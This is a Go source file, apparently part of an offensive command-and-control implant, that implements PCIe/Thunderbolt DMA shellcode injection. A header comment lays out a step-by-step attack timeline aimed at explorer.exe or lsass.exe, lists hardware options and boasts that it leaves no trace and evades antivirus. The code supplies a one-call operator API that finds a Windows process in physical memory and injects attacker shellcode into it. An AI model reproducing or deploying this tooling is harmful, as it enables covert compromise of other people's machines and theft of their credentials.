// Package pciedma implements D-P7: PCIe DMA Payload Injection.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// PCIe Direct Memory Access allows hardware to read/write ALL system RAM
// without involving the CPU or operating system. Thunderbolt ports expose
// the PCIe bus to connected devices.
//
// 30-second attack timeline:
//
//   t=0s   Attacker plugs in a malicious Thunderbolt device
//   t=1s   Device is enumerated as a PCIe endpoint
//   t=2s   DMA access granted (if IOMMU disabled / Thunderbolt SL0/1)
//   t=5s   Scan physical RAM → find target process EPROCESS
//   t=10s  Walk process list → find explorer.exe / lsass.exe
//   t=15s  Translate VA → PA → find code cave / function pointer
//   t=20s  Write shellcode via DMA → patch function pointer
//   t=25s  Next function call → shellcode executes → Ghost implant loaded
//   t=30s  Attacker unplugs device → NO TRACE LEFT
//
// No software needed on the target. No exploit needed.
// No user interaction. No AV/EDR can stop it (DMA bypasses all software).
//
// ───────────────────────────────────────────────────────────────────────────
// HARDWARE REQUIREMENTS
// ───────────────────────────────────────────────────────────────────────────
//
//   Option 1: FPGA (PCILeech-FPGA)
//     - Xilinx Artix-7 35T/75T ($30-$150)
//     - Programmed with PCILeech firmware from github.com/ufrisk/pcileech-fpga
//     - Connected via PCIe or M.2 adapter
//     - Controlled remotely via USB/UART or standalone
//
//   Option 2: Raspberry Pi CM4 with PCIe HAT
//     - Pi CM4 has a native PCIe x1 lane
//     - With appropriate HAT: acts as PCIe endpoint device
//     - Runs this Go code directly (ARM64)
//     - Thunderbolt adaptation: requires TB-to-PCIe adapter
//
//   Option 3: Existing Thunderbolt device
//     - Some TB3/TB4 devices (eGPUs, docking stations) expose DMA
//     - Firmware modification to add our scanning capability
//     - Higher risk of detection (device is recognizable)
//
// ───────────────────────────────────────────────────────────────────────────
// SOFTWARE STACK
// ───────────────────────────────────────────────────────────────────────────
//
//   Hardware (FPGA/Pi) → LeechCore library → this package
//
//   pciedma/
//   ├── device/        DMA device abstraction (LeechCore + /dev/mem)
//   ├── scanner/       Process discovery via physical memory scanning
//   ├── injector/      Code injection (cave / stack / PTE)
//   └── pciedma.go     One-call operator API
//
package pciedma

import (
	"fmt"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/pciedma/device"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/pciedma/injector"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/pciedma/scanner"
)

// AttackConfig holds all parameters for a DMA injection attack.
type AttackConfig struct {
	// Device config.
	DeviceType    string // "leechcore", "devmem"
	DeviceConn    string // LeechCore connection string (e.g., "fpga")

	// Target.
	TargetProcess string // process name (e.g., "explorer.exe")
	PhysMemEnd    uint64 // physical RAM end (0 = auto-detect 16GB)

	// Payload.
	Shellcode     []byte // position-independent x64 shellcode
	Technique     injector.InjectionTechnique

	// Behavior.
	RestoreAfter  bool          // clean up injection after shellcode runs
	Timeout       time.Duration // total attack timeout (0 = 60s)
}

// AttackResult reports the outcome.
type AttackResult struct {
	ProcessFound    *scanner.ProcessInfo
	Injected        *injector.InjectionResult
	TotalTime       time.Duration
}

// Execute runs the full PCIe DMA injection attack.
func Execute(cfg *AttackConfig) (*AttackResult, error) {
	if cfg.Timeout == 0 {
		cfg.Timeout = 60 * time.Second
	}
	start := time.Now()

	// Open DMA device.
	var dev device.DMADevice
	var err error
	switch cfg.DeviceType {
	case "leechcore":
		dev, err = device.OpenLeechCore(cfg.DeviceConn)
	case "devmem":
		dev, err = device.OpenDevMem()
	default:
		return nil, fmt.Errorf("unknown device type: %s", cfg.DeviceType)
	}
	if err != nil {
		return nil, fmt.Errorf("open DMA device: %w", err)
	}
	defer dev.Close()

	// Find target process.
	sc := scanner.NewWindowsScanner(dev)
	proc, err := sc.FindProcess(cfg.TargetProcess, cfg.PhysMemEnd)
	if err != nil {
		return nil, fmt.Errorf("find %s: %w", cfg.TargetProcess, err)
	}

	res := &AttackResult{ProcessFound: proc}

	// Inject shellcode.
	inj := injector.NewInjector(sc)
	injResult, err := inj.Inject(&injector.InjectionConfig{
		Shellcode:       cfg.Shellcode,
		TargetProcess:   proc,
		Technique:       cfg.Technique,
		RestoreOriginal: cfg.RestoreAfter,
	})
	if err != nil {
		return res, fmt.Errorf("inject into %s (PID=%d): %w",
			proc.Name, proc.PID, err)
	}
	res.Injected  = injResult
	res.TotalTime = time.Since(start)
	return res, nil
}

// QuickAttack is a simplified one-call API.
// Connects to the first available FPGA, finds the target process, and injects.
func QuickAttack(targetProcess string, shellcode []byte) (*AttackResult, error) {
	return Execute(&AttackConfig{
		DeviceType:    "leechcore",
		DeviceConn:    "fpga",
		TargetProcess: targetProcess,
		Shellcode:     shellcode,
		Technique:     injector.TechniqueCodeCave,
	})
}
